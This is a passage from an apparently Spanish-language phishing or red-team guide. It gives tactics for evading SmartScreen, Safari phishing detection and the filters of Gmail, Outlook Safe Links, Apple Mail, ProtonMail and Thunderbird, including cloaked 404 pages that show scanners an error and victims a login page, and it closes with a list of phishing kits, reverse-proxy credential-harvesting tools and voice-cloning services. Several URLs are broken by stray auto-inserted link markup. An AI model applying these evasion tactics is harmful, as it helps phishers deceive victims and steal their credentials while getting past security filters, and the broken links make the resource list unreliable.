# - Bloquea downloads no confiables

# Evasión de SmartScreen:
# - Dominios con reputación (>6 meses)
# - Páginas que NO parezcan login (usar página real + popup)
# - Downloads firmados con certificado

# Apple Phishing Detection (Safari):
# - Detecta formularios de contraseñas en páginas no HTTPS
# - Con HTTPS no muestra advertencias

# Common bypass:
# 1. Usar services legítimos como proxy
#    - Google Forms: google.com/forms
#    - Notion: notion.so/...
#    - Trello: trello.com/...
# 2. Páginas de error 404 custom
#    - El scanner ve 404
#    - La víctima ve el login (JS cambia el contenido)
```

### 24.4 Email Client Phishing Filter Bypass

```bash
# === Bypass de filtros de clientes de correo ===

# Gmail:
# - Bloquea imágenes por defecto (tracking pixel)
# - Muestra advertencia en links sospechosos
# - Categoriza en Promotions/Social/Updates automáticamente
# Bypass:
# - Usar dominio con buena reputación
# - Texto plano (sin HTML) en email inicial
# - Evitar palabras de spam: "click here", "urgent", "password"

# Outlook/Office 365:
# - Exchange Online Protection (EOP)
# - ATP (Advanced Threat Protection) links scanning
# - Safe Links: rewrite todos los links para escanearlos
# Bypass:
# - Safe Links rewrite usa el dominio original + parámetros
# - Si el dominio es legítimo y el link se ve OK, pasa
# - Usar redirects en dominios legítimos

# Apple Mail:
# - Apple Privacy Protection: descarga remota de imágenes
# - Bloquea trackers conocidos
# Bypass:
# - Los links no se escanean activamente
# - Más permisivo que Gmail/Outlook

# ProtonMail:
# - Zero-access encryption
# - No puede escanear contenido (está cifrado)
# - Pero la metadata (remitente, asunto) se analiza
# Bypass:
# - Enviar desde ProtonMail a ProtonMail (cifrado extremo a extremo)
# - El contenido cifrado no se puede analizar

# Thunderbird:
# - No tiene filtros avanzados
# - Todo depende del servidor de correo
# Bypass: llegar al servidor superando SPF/DKIM/DMARC
```

---

## 25. Recursos Finales

- **[gophish](../raw/ph1sh1ng.md#gophish) API**: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://docs.getgophish.[com](../raw/w1n-s9bsyst3ms.md#com)/api/
- **[phishing](../raw/ph1sh1ng.md) Database**: https://github.com/mitchellkrogza/[phishing](../raw/ph1sh1ng.md).Database
- **CanIPhish**: https://www.caniphish.com
- **Evilginx2 Phishlets**: https://github.com/An0nUD4Y/Evilginx2-Phishlets
- **Modlishka Templates**: https://github.com/drk1wi/Modlishka
- **Muraena**: https://github.com/muraenateam/muraena
- **Necrobrowser**: https://github.com/muraenateam/necrobrowser
- **SocialEngineer Toolkit**: https://github.com/trustedsec/social-engineer-toolkit
- **King Phisher**: https://github.com/securestate/king-phisher
- **Phishing Frenzy**: https://github.com/DeapSECURE/PhishingFrenzy
- **PhishEye**: https://github.com/LukaSikic/PhishEye
- **CredSniper**: https://github.com/ustayready/CredSniper
- **HiddenEye**: https://github.com/DarkSecDevelopers/HiddenEye
- **ShellPhish**: https://github.com/thelinuxchoice/shellphish
- **SocialFish**: https://github.com/UndeadSec/SocialFish
- **Zphisher**: https://github.com/htr-tech/zphisher
- **AdvPhishing**: https://github.com/Ignitetch/AdvPhishing
- **BlackEye**: https://github.com/An0nUD4Y/blackeye
- **Asterisk**: https://www.asterisk.org/
- **Twilio**: https://www.twilio.com
- **ElevenLabs Voice Cloning**: https://elevenlabs.io
- **Resemble AI**: https://www.resemble.ai
- **PlayHT**: https://play.ht
- **Mail-tester**: https://www.mail-tester.com
- **MXToolbox**: https://mxtoolbox.com
- **Google Postmaster**: https://postmaster.google.com/
- **Microsoft SNDS**: https://sendersupport.olc.protection.outlook.com/snds/
- **dnstwist**: https://github.com/elceef/dnstwist
- **theHarvester**: https://github.com/laramies/theHarvester
- **Hunter.io**: https://hunter.io
- **DeHashed**: https://dehashed.com
- **Have I Been Pwned**: https://haveibeenpwned.com


